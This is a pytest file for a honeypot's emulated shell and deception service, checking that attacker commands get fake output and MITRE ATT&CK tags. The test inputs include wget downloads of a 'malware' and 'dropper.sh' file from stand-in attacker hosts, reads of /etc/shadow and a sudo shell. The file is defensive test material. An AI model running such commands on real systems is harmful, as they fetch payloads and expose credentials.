"""
Unit tests for VirtualShell and DeceptionService.
"""

from __future__ import annotations

import pytest

from src.honeypot.recorder import SessionRecorder
from src.honeypot.server import DeceptionService, VirtualShell


def test_virtual_shell_basic_commands():
    shell = VirtualShell(current_user="root", hostname="honeypot-srv")

    out, code, cats, mitre = shell.execute("whoami")
    assert out.strip() == "root"
    assert code == 0
    assert "recon" in cats

    out, code, cats, mitre = shell.execute("id")
    assert "uid=0(root)" in out
    assert code == 0

    out, code, cats, mitre = shell.execute("uname -a")
    assert "Linux" in out
    assert "x86_64" in out
    assert "T1082" in mitre

    out, code, cats, mitre = shell.execute("hostname")
    assert out.strip() == "honeypot-srv"


def test_virtual_shell_fs_and_cat():
    shell = VirtualShell(current_user="root")

    out, code, _, _ = shell.execute("ls")
    assert ".bashrc" in out

    out, code, cats, _ = shell.execute("cat /etc/passwd")
    assert "root:x:0:0" in out
    assert code == 0
    assert "credential_access" in cats

    out, code, _, _ = shell.execute("cat /etc/shadow")
    assert "root:$6$" in out  # accessible to root

    # Non-root user
    user_shell = VirtualShell(current_user="analyst")
    out, code, _, _ = user_shell.execute("cat /etc/shadow")
    assert "Permission denied" in out
    assert code == 1


def test_virtual_shell_ttp_tagging():
    shell = VirtualShell()

    _, _, cats, mitre = shell.execute("wget http://attacker.com/malware")
    assert "download" in cats
    assert "T1105" in mitre

    _, _, cats, mitre = shell.execute("sudo /bin/bash")
    assert "privilege_escalation" in cats
    assert "T1548.003" in mitre

    _, _, cats, mitre = shell.execute("crontab -e")
    assert "persistence" in cats
    assert "T1053.003" in mitre


def test_virtual_shell_cd_and_pwd():
    shell = VirtualShell()
    assert shell.cwd == "/root"

    shell.execute("cd /var/log")
    assert shell.cwd == "/var/log"

    out, _, _, _ = shell.execute("pwd")
    assert out.strip() == "/var/log"


def test_deception_service_lifecycle():
    rec = SessionRecorder()
    service = DeceptionService(recorder=rec)

    # 1. Connection
    session = service.handle_connection(
        source_ip="203.0.113.88",
        source_port=54321,
        client_version="SSH-2.0-OpenSSH_8.9p1",
    )
    assert session.is_active

    # 2. Authentication
    success = service.handle_auth(session.session_id, "root", "root123", allow_login=True)
    assert success
    assert session.authenticated

    # 3. Interactive commands
    out, code = service.handle_command(session.session_id, "uname -a")
    assert "Linux" in out

    out, code = service.handle_command(session.session_id, "wget http://bad.com/dropper.sh")
    assert "saved" in out

    # Verify download artifact was created
    updated = rec.get_session(session.session_id)
    assert updated is not None
    assert len(updated.artifacts) == 1
    assert "T1105" in updated.mitre_techniques

    # 4. Disconnect
    closed = service.handle_disconnect(session.session_id)
    assert closed is not None
    assert not closed.is_active
    assert "wget" in closed.summary
